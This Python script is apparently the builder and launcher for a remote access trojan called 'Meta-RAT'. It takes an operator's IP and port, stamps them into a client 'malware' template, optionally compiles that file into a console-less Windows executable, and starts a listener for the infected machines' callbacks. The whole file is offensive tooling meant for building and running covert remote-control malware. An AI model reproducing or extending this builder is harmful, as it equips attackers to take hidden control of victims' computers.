def main_run():


    import os
    from time import sleep
    from colorama import Fore 
    import platform
    import random


    #while True:
    osname = platform.uname()

    if "Windows" in osname:
        os.system('cls')
    else:
        os.system('clear')
    sleep(0.2)

    print(Fore.LIGHTCYAN_EX + '''
     __  __      _              ____      _  _____ 
    |  \/  | ___| |_ __ _      |  _ \    / \|_   _|
    | |\/| |/ _ \ __/ _` |_____| |_) |  / _ \ | |  
    | |  | |  __/ || (_| |_____|  _ <  / ___ \| |  
    |_|  |_|\___|\__\__,_|     |_| \_\/_/   \_\_|  

                                            
    Made By Taha                               v1
    Instagram : @taha.security_
    Github    : https://github.com/Taha-Security
    ''')

    sleep(0.2)

    def make():
        ipaddr = input(Fore.LIGHTWHITE_EX + '\n    Enter Your Ip > ')
        port = input(Fore.LIGHTWHITE_EX + '\n    Enter Your Port > ')
        malware_name = input(Fore.LIGHTWHITE_EX + '\n    Enter Malware Name : ')
        cover = open('payload/client.py','r').read()
        codes = cover.replace('myip',ipaddr).replace('myport',port).replace('myname',malware_name)
        output = open(f'output/{malware_name}.py','w').write(codes)
        print(Fore.LIGHTGREEN_EX + '\n    Your Client File Created...\n')
        print(Fore.LIGHTGREEN_EX + '    Chack output Folder\n')
        get = input('    Do You Want To Convert It In .exe ? (Without Icon) [y/n] ')

        if get == 'Y' or get == 'y':

            try:
                os.system('pyinstaller output/client.py --onefile --noconsole')
                print('Wait...')
                sleep(8)
                print(Fore.LIGHTRED_EX + 'Please Check output Folder')
            except:
                print(Fore.RED+'We Have Problme Here')

    def listener_a():
        getport = input(Fore.LIGHTWHITE_EX + '\n    Enter Your Port : ')
        getip = input(Fore.LIGHTWHITE_EX+'\n    Enter Your Local Ip : ')
        scode = open('module/server.py','r').read().replace('myip',getip).replace('myport',getport)
        wcode = open('module/listener.py','w').write(scode)
        osnamme = platform.uname()

        if "Windows" in osnamme:
            os.system('python module/listener.py')
        else:
            os.system('python3 module/listener.py')

    get_option = input(Fore.LIGHTRED_EX + '    Choice [Listener/Make payload/Exit] > ')
    if get_option == 'make payload' or get_option == 'make' or get_option == 'Make payload':
        make()
    elif get_option == 'Listener' or get_option == 'listener':
        listener_a()
    elif get_option == 'Exit' or get_option == 'exit':
        exit()
